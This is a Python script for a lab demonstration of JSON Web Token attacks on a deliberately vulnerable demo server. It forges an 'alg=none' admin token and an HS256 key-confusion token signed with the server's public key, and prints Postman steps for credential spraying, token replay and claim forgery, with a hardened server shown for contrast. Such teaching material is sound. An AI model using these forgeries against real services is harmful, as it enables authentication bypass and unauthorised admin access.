"""
postman_tokens.py — Generate all tokens needed for Postman demo
===============================================================
Run this once while the server is running.
Copy-paste the printed tokens into Postman Authorization headers.

Usage:
  python postman_tokens.py
"""

import base64, hashlib, hmac, json, requests

TARGET = "http://10.236.147.152:5000"   # change to your server IP if needed


def b64url(data: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=").decode()
    )


def sep():
    print("-" * 65)


print("=" * 65)
print("  POSTMAN TOKEN GENERATOR")
print(f"  Server: {TARGET}")
print("=" * 65)

# ── 1. Legitimate alice token (for replay demo) ───────────────────────────
sep()
print("TOKEN 1 — Legitimate alice token  (use for Token Replay)")
try:
    r = requests.post(f"{TARGET}/login", json={"username": "alice", "password": "pass123"}, timeout=4)
    alice_token = r.json()["token"]
    print(f"  {alice_token}")
except Exception as e:
    print(f"  ERROR: {e}")
    alice_token = None

# ── 2. Legitimate admin token (for comparison) ────────────────────────────
sep()
print("TOKEN 2 — Legitimate admin token  (real admin, for comparison)")
try:
    r = requests.post(f"{TARGET}/login", json={"username": "admin", "password": "secret99"}, timeout=4)
    print(f"  {r.json()['token']}")
except Exception as e:
    print(f"  ERROR: {e}")

# ── 3. alg=none forged token ──────────────────────────────────────────────
sep()
print("TOKEN 3 — Forged alg=none token   (Attack 1 + Attack 3 — Claim Forgery)")
h = b64url({"alg": "none", "typ": "JWT"})
p = b64url({"user": "attacker", "role": "admin"})
none_token = f"{h}.{p}."
print(f"  {none_token}")

# ── 4. HS256 confusion token ──────────────────────────────────────────────
sep()
print("TOKEN 4 — Forged HS256 confusion token  (Attack 2)")
try:
    pub_key = requests.get(f"{TARGET}/public-key", timeout=4).text
    h2 = b64url({"alg": "HS256", "typ": "JWT"})
    p2 = b64url({"user": "attacker", "role": "admin"})
    signing_input = f"{h2}.{p2}".encode()
    sig = hmac.new(pub_key.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    hs256_token = f"{h2}.{p2}.{sig_b64}"
    print(f"  {hs256_token}")
except Exception as e:
    print(f"  ERROR: {e}")
    hs256_token = None

print("=" * 65)
print()
print("HOW TO USE IN POSTMAN:")
print()
print("  Step 1 — Login (Credential Spray):")
print(f"    POST {TARGET}/login")
print('    Body (JSON): {"username": "admin", "password": "secret99"}')
print()
print("  Step 2 — View profile (Token Replay):")
print(f"    GET {TARGET}/profile")
print("    Header: Authorization: Bearer <paste TOKEN 1>")
print("    Run this request 5 times — all accepted (no expiry)")
print()
print("  Step 3 — Attack 1, alg=none + Claim Forgery:")
print(f"    GET {TARGET}/admin")
print("    Header: Authorization: Bearer <paste TOKEN 3>")
print("    Expected: HTTP 200 + flag{jwt_alg_confusion_2025}")
print()
print("  Step 4 — Attack 2, HS256 confusion:")
print(f"    GET {TARGET}/admin")
print("    Header: Authorization: Bearer <paste TOKEN 4>")
print("    Expected: HTTP 200 + flag{jwt_alg_confusion_2025}")
print()
print("  Step 5 — Same tokens vs HARDENED server (port 5001):")
print(f"    GET http://{TARGET.split('//')[1].replace('5000','5001')}/admin")
print("    Header: Authorization: Bearer <paste TOKEN 3 or 4>")
print("    Expected: HTTP 401 — Token rejected")
print()
